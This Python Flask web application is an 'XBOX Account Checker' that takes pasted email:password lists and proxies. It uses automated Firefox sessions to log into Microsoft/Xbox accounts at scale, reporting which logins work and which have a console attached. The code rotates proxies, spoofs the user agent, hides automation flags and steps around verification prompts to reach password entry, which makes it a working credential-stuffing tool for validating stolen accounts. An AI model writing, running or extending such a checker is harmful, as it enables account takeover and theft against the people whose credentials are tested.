#!/usr/bin/env python3
"""
XBOX Account Checker - Web Version
Flask backend with Socket.IO for real-time communication
"""

import asyncio
import csv
import os
import threading
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

# ========== تحديد مسار تخزين المتصفحات (لـ Railway) ==========
os.environ['PLAYWRIGHT_BROWSERS_PATH'] = '/app/browsers'

app = Flask(__name__)
app.config['SECRET_KEY'] = 'xbox-checker-secret'
socketio = SocketIO(app, cors_allowed_origins="*")

DEFAULT_TIMEOUT = 60000

# ---------- Helper Functions ----------
def parse_accounts_from_text(text: str) -> List[Dict]:
    accounts = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts

def parse_proxies_from_text(text: str) -> List[Optional[str]]:
    proxies = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if line and not line.startswith('#'):
            proxies.append(line)
    return proxies

async def check_console_availability(page) -> Tuple[bool, str, bool]:
    console_url = "https://www.xbox.com/en-US/play/consoles"
    for attempt in range(1, 4):
        try:
            await page.goto(console_url, timeout=60000)
            await page.wait_for_load_state("domcontentloaded", timeout=30000)
            await asyncio.sleep(1.5)
            page_text = await page.inner_text('body')
            page_text_lower = page_text.lower()
            if "play your console remotely" in page_text_lower:
                return True, "Play your console remotely (device exists)", True
            if "set up your console" in page_text_lower:
                return False, "Set up your console (logged in, no device)", True
            if "sign in to finish setting up" in page_text_lower:
                return False, "Sign in to finish setting up (login incomplete)", False
        except Exception:
            continue
    return False, "Unknown page content", False

async def handle_password_entry(page, account_email: str, password: str) -> bool:
    try:
        try:
            await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=4000)
            await page.fill("input[type='password'], input[name='passwd']", password)
            await asyncio.sleep(1)
            return True
        except PlaywrightTimeoutError:
            pass
        try:
            element = page.locator("a:has-text('Sign in another way'), span:has-text('Sign in another way')").first
            if await element.count() > 0:
                await element.click(timeout=2000)
                await page.wait_for_load_state("domcontentloaded")
        except:
            pass
        try:
            element = page.locator("a:has-text('Use your password'), span:has-text('Use your password')").first
            if await element.count() > 0:
                await element.click(timeout=2000)
                await page.wait_for_load_state("domcontentloaded")
        except:
            pass
        await page.wait_for_selector("input[type='password'], input[name='passwd']", timeout=8000)
        await page.fill("input[type='password'], input[name='passwd']", password)
        await asyncio.sleep(1)
        return True
    except Exception:
        return False

async def handle_verification_screens(page, log_callback, email: str) -> bool:
    try:
        await asyncio.sleep(1.5)
        page_content = await page.content()
        verification_keywords = [
            "Check your Outlook app", "In your Outlook app",
            "Check your Authenticator app", "In your Authenticator app",
            "Verify your phone number", "We will send a verification code",
            "Enter the last 4 digits"
        ]
        is_verification = any(keyword in page_content for keyword in verification_keywords)
        if not is_verification:
            return False
        log_callback(f"⚠️ {email} -> Verification screen. Clicking 'Other ways to sign in'...")
        clicked = False
        try:
            await page.click("text=Other ways to sign in", timeout=5000)
            clicked = True
        except:
            try:
                await page.locator("a:has-text('Other ways to sign in'), div:has-text('Other ways to sign in')").first.click(timeout=5000)
                clicked = True
            except:
                pass
        if not clicked:
            return False
        await page.wait_for_load_state("domcontentloaded")
        await asyncio.sleep(2)
        log_callback(f"🔑 {email} -> Looking for 'Use my password'...")
        clicked_pwd = False
        for pwd_text in ["Use my password", "Use your password"]:
            try:
                await page.click(f"text={pwd_text}", timeout=3000)
                clicked_pwd = True
                log_callback(f"✅ {email} -> Clicked '{pwd_text}'")
                break
            except:
                try:
                    await page.locator(f"a:has-text('{pwd_text}'), div:has-text('{pwd_text}')").first.click(timeout=3000)
                    clicked_pwd = True
                    break
                except:
                    continue
        if clicked_pwd:
            await page.wait_for_load_state("domcontentloaded")
            await asyncio.sleep(1)
            return True
        return False
    except Exception as e:
        log_callback(f"⚠️ {email} -> Error in verification: {str(e)[:80]}")
        return False

async def process_single_account(account: Dict, proxy: Optional[str], headless: bool, log_callback) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    try:
        log_callback(f"🔐 Starting: {account['email']}")
        async with async_playwright() as p:
            browser_options = {
                'headless': headless,
                'args': [
                    '--disable-gpu',
                    '--disable-dev-shm-usage',
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-accelerated-2d-canvas',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-renderer-backgrounding',
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--disable-blink-features=AutomationControlled',
                    '--window-size=1280,720',
                    '--mute-audio',
                    '--disable-notifications'
                ]
            }
            if proxy:
                browser_options['proxy'] = {'server': proxy}
            # استخدم Firefox بدلاً من Chromium لتقليل الحجم
            browser = await p.firefox.launch(**browser_options)
            context = await browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            )
            # منع تحميل الصور
            await context.route("**/*.{png,jpg,jpeg,webp,gif}", lambda route: route.abort())
            page = await context.new_page()
            
            # Login
            await page.goto("https://www.xbox.com/en-US/auth/msa?action=logIn&returnUrl=http%3A%2F%2Fwww.xbox.com%2Fen-US%2Fplay%2Fconsoles", timeout=DEFAULT_TIMEOUT)
            await page.wait_for_load_state("domcontentloaded")
            
            # Email
            await page.wait_for_selector("input[type='email'], input[name='loginfmt']", timeout=DEFAULT_TIMEOUT)
            await page.fill("input[type='email'], input[name='loginfmt']", account['email'])
            await asyncio.sleep(1)
            try:
                await page.locator("input[type='submit'], input#idSIButton9").first.click(timeout=5000)
            except:
                await page.keyboard.press("Enter")
            await page.wait_for_load_state("domcontentloaded")
            
            # Handle verification screens
            await handle_verification_screens(page, log_callback, account['email'])
            
            # Password
            if not await handle_password_entry(page, account['email'], account['password']):
                raise Exception("Could not enter password")
            try:
                await page.locator("input[type='submit'], input#idSIButton9").first.click(timeout=5000)
            except:
                await page.keyboard.press("Enter")
            await page.wait_for_load_state("domcontentloaded")
            
            # Stay signed in
            try:
                await page.locator("input[value='Yes'], button:has-text('Yes')").first.click(timeout=3000)
            except:
                pass
            
            has_console, console_info, login_success = await check_console_availability(page)
            result['success'] = login_success
            result['has_console'] = has_console
            result['console_info'] = console_info
            
            await browser.close()
            
            if has_console:
                log_callback(f"🎉 {account['email']} -> Device found!")
            elif login_success:
                log_callback(f"ℹ️ {account['email']} -> Logged in, no device")
            else:
                log_callback(f"❌ {account['email']} -> Login failed: {console_info}")
    except Exception as e:
        result['success'] = False
        result['console_info'] = f"Exception: {str(e)[:80]}"
        log_callback(f"❌ {account['email']} -> Error: {str(e)[:100]}")
    return result

async def run_checker(accounts: List[Dict], proxies: List[str], concurrency: int, headless: bool, log_callback):
    semaphore = asyncio.Semaphore(concurrency)
    results = []
    async def process_with_semaphore(account, idx):
        async with semaphore:
            proxy = proxies[idx % len(proxies)] if proxies else None
            return await process_single_account(account, proxy, headless, log_callback)
    tasks = [process_with_semaphore(account, i) for i, account in enumerate(accounts)]
    results = await asyncio.gather(*tasks)
    return results

# ---------- Flask Routes ----------
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_check', methods=['POST'])
def start_check():
    data = request.json
    accounts_text = data.get('accounts', '')
    proxies_text = data.get('proxies', '')
    concurrency = int(data.get('concurrency', 3))
    headless = data.get('headless', False)
    accounts = parse_accounts_from_text(accounts_text)
    if not accounts:
        return jsonify({'error': 'No valid accounts provided'}), 400
    proxies = parse_proxies_from_text(proxies_text) if proxies_text else []
    def run_async_check():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        def log_callback(msg):
            socketio.emit('log', {'message': msg})
        socketio.emit('log', {'message': f"✅ Loaded {len(accounts)} accounts, {len(proxies)} proxies"})
        socketio.emit('log', {'message': f"⚙️ Concurrency: {concurrency}, Headless: {headless}"})
        socketio.emit('log', {'message': "🚀 Starting account checks..."})
        results = loop.run_until_complete(run_checker(accounts, proxies, concurrency, headless, log_callback))
        socketio.emit('results', {'results': results})
        socketio.emit('log', {'message': "✅ All checks completed!"})
        loop.close()
    thread = threading.Thread(target=run_async_check)
    thread.start()
    return jsonify({'status': 'started', 'account_count': len(accounts)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port, debug=False)
